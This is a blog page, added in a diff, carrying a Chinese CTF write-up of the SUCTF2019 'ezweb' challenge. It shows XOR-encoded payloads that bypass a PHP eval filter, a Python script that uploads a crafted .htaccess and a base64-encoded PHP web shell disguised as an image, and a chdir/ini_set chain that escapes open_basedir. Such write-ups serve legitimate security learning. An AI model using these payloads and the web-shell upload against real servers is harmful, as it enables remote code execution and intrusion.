@@ -1,0 +1,1065 @@
+<!DOCTYPE HTML>
+<html lang="">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SUCTF2019 ezweb, Z3ratu1&#39;s blog">
+    <meta name="description" content="SUCTF2019 ezwebBUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了
+第一层第一层源码
+$hhh = @$_GET&amp;amp;#91;&#39;_&#39;&amp;amp;#93;;
+">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>SUCTF2019 ezweb | Z3ratu1&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Z3ratu1's blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+	<li class="hide-on-med-and-down nav-item" >
+		
+					  <a href="/" class="waves-effect waves-light">
+						
+						<i class="fa fa-home"></i>
+						
+						<span>Index</span>
+					</a>
+          
+        </li>
+    
+	<li class="hide-on-med-and-down nav-item" >
+		
+					  <a href="/tags" class="waves-effect waves-light">
+						
+						<i class="fa fa-tags"></i>
+						
+						<span>Tags</span>
+					</a>
+          
+        </li>
+    
+	<li class="hide-on-med-and-down nav-item" >
+		
+					  <a href="/categories" class="waves-effect waves-light">
+						
+						<i class="fa fa-bookmark"></i>
+						
+						<span>Categories</span>
+					</a>
+          
+        </li>
+    
+	<li class="hide-on-med-and-down nav-item" >
+		
+					  <a href="/archives" class="waves-effect waves-light">
+						
+						<i class="fa fa-archive"></i>
+						
+						<span>Archives</span>
+					</a>
+          
+        </li>
+    
+	<li class="hide-on-med-and-down nav-item" >
+		
+					  <a href="/about" class="waves-effect waves-light">
+						
+						<i class="fa fa-user-circle-o"></i>
+						
+						<span>About</span>
+					</a>
+          
+        </li>
+    
+	<li class="hide-on-med-and-down nav-item" >
+		
+					  <a href="/friends" class="waves-effect waves-light">
+						
+						<i class="fa fa-address-book"></i>
+						
+						<span>Friends</span>
+					</a>
+          
+        </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Z3ratu1's blog</div>
+        <div class="logo-desc">
+            
+            与其感慨路难行，不如现在出发
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa fa-fw fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa fa-fw fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa fa-fw fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa fa-fw fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa fa-fw fa-user-circle-o"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa fa-fw fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Z3ratu1" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill=red style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill=black class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf1.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        SUCTF2019 ezweb
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/php/" target="_blank">
+                                <span class="chip bg-color">php</span>
+                            </a>
+                        
+                            <a href="/tags/wp/" target="_blank">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                刷题记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-02-12
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
+                        1.5k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
+                        6 Min
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SUCTF2019-ezweb"><a href="#SUCTF2019-ezweb" class="headerlink" title="SUCTF2019 ezweb"></a>SUCTF2019 ezweb</h1><p>BUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了</p>
+<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>第一层源码</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">'_'</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/&amp;#91;\x00- 0-9A-Za-z\'"\`~_&amp;.,|=&amp;#91;\x7F&amp;#93;+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><strong>PS：不可见字符全部以十六进制编码的方式进行了展示，复现时需注意（因为url编码hexo要报错）</strong></p>
+<p>PHP特性”Use of undeﬁned constant”会将代码中没有引号的字符默认为字符串，因此我们_GET过去的数据也都被认为是字符串<br>又ASCII大于0x7F的字符都会被认为是字符串，因此在过滤了全部字母和数字的情况下，我们还可以用不可见字符进行异或或者取反来得到需要的内容<br>这里取反也挂了，所以用异或，同时异或&amp;#37FF就等于取反，并且&amp;#37FF还相对节约了一个字符，如果可行也不需要太麻烦的fuzz测试去找怎么异或，思路是再搞一个$_GET来绕过之前的一大堆限制，这里_GET的参数要是之前用来异或过的内容，节约字符串<br>$_GET&#91;&#93;的中括号也挂了，这个用大括号直接替代也没有问题,构造出如下payload并成功执行，第一层就算过了<br><code>?_=$&amp;#1230xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa&amp;#125&amp;#1230xfe&amp;#125();&amp;0xfe=phpinfo</code><br>这里整体payload作为被默认作为了一个字符串进入eval函数，而eval函数将整个字符串作为代码执行，其中ASCII大于0x7f的不可见字符又会被认作字符串进行异或，最终得出我们想要的结果</p>
+<p>实际上异或能凑的不同字符数这么少不容易，如果不行就得fuzz所有组合眼睛看的去找了</p>
+<h3 id="第一个坑"><a href="#第一个坑" class="headerlink" title="第一个坑"></a>第一个坑</h3><p>wp中payload为<code>?_=$&amp;#123&amp;#37fe&amp;#37fe&amp;#37fe&amp;#37fe^&amp;#37a1&amp;#37b9&amp;#37bb&amp;#37aa&amp;#125&amp;#123&amp;#37fe&amp;#125();&amp;&amp;#37fe=phpinfo</code><br>这里_GET也需用大括号括起来，因为eval在执行过程中，如果遇到了$符号，则直接将后续部分任务是变量名，这样我们就得到了一个名为<code>$&amp;#1230xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa&amp;#125</code>的变量，不去计算异或，然后产生错误退出，添加大括号之后使得我们先执行大括号中的内容，将异或后的_GET拿了出来，才能得到正确的结果</p>
+<h3 id="第二个坑"><a href="#第二个坑" class="headerlink" title="第二个坑"></a>第二个坑</h3><p>本地测试<br><code>eval($_GET&amp;#91;&#39;a&#39;&amp;#93;);</code>时<br>当<code>?a=$_GET&amp;#91;b&amp;#93;();&amp;b=phpinfo</code>时能正常执行，而<code>?a=$_GET&amp;#91;b&amp;#93;&amp;b=phpinfo();</code>试了半天。。。。不会调试的我也太菜了。<br>就是当一个变量以$a()的形式出现的时候，PHP会认为它是一个函数，从而eval就会执行phpinfo();这个函数，如果我们以后者的方式进行执行，就只是一个$_GET&#91;b&#93;，得到了一个内容为<code>phpinfo();</code>的字符串，存在$_GET这个全局变量里面</p>
+<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p>第一层过了之后可以执行的get_the_flag函数</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>
+    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">'REMOTE_ADDR'</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;);</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">"file"</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;))&amp;#123</span>
+        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">"file"</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;&amp;#91;</span><span class="token string">"tmp_name"</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;;</span>
+        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">"file"</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;&amp;#91;</span><span class="token string">"name"</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;;</span>
+        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
+        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span></code></pre>
+<p>可以先看一下PHP版本，7+所以过滤&lt;?之后&lt;script&gt;这种方法就绕不过去了，并且过滤了ph的后缀，利用htaccess绕过<br>需要手搓代码上传文件，知识盲区，网上抄了一个现成脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+
+url <span class="token operator">=</span> <span class="token string">"http://b11cd486-9833-4bef-bf24-967205c05ada.node3.buuoj.cn/?_=$&amp;#123&amp;#37fe&amp;#37fe&amp;#37fe&amp;#37fe^&amp;#37a1&amp;#37b9&amp;#37bb&amp;#37aa&amp;#125&amp;#123&amp;#37fe&amp;#125();"</span> \
+      <span class="token string">"&amp;&amp;#37fe=get_the_flag"</span>
+
+
+htaccess <span class="token operator">=</span> b<span class="token triple-quoted-string string">"""#define width 1 
+#define height 1 
+AddType application/x-httpd-php .cc
+php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"
+
+"""</span>
+<span class="token comment" spellcheck="true"># 把.cc解析为PHP，并且将上传的shell添加到末尾，base64编码绕过检测</span>
+
+shell <span class="token operator">=</span> b<span class="token string">"\x00\x00\x8a\x39\x8a\x39"</span><span class="token operator">+</span>b<span class="token string">"00"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"&lt;?php eval($_GET&amp;#91;'c'&amp;#93;);?>"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'>eval($_REQUEST&amp;#91;c&amp;#93;);&lt;/script>"</span>
+<span class="token comment" spellcheck="true"># 玄妙的字符可以绕过exif_imagetype，补的00用来base64解码，否则解码可能无法还原后面shell部分。字符串前面的b表示字符串为byte类型，为网络数据传输需要格式</span>
+
+files <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#91;('file', ('.htaccess', htaccess, 'image/jpeg'))&amp;#93;</span>
+
+data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123"upload": "Submit"&amp;#125</span>
+
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+
+files <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#91;('file', ('shell.cc', shell, 'image/jpeg'))&amp;#93;</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p>open_basedir绕过<br>这个shell打上去之后就基本为所欲为，但是看phpinfo可以看到一个open_basedir的限制，直接用chdir加ini_set绕过<code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个题看记录是去年十月底左右开始写的，之后十一月份就开始忙srtp？还是期末？寒假浑浑噩噩到现在才开始继续学习，今天算是把之前欠下的补回来，总的来说，没好好学习呜呜呜，最近加油吧，时隔三个多月完全没看题，现在的我又是一个零基础菜逼了</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677</a><br><a href="https://www.smi1e.top/&amp;#37E5&amp;#379B&amp;#37BD&amp;#37E8&amp;#37B5&amp;#379Blove_math&amp;#37E9&amp;#37A2&amp;#3798&amp;#37E8&amp;#37A7&amp;#37A3/" target="_blank" rel="noopener">https://www.smi1e.top/&amp;#37E5&amp;#379B&amp;#37BD&amp;#37E8&amp;#37B5&amp;#379Blove_math&amp;#37E9&amp;#37A2&amp;#3798&amp;#37E8&amp;#37A7&amp;#37A3/</a></p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+<!--    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>-->
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>Reprint policy</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《SUCTF2019 ezweb》
+                </span> by
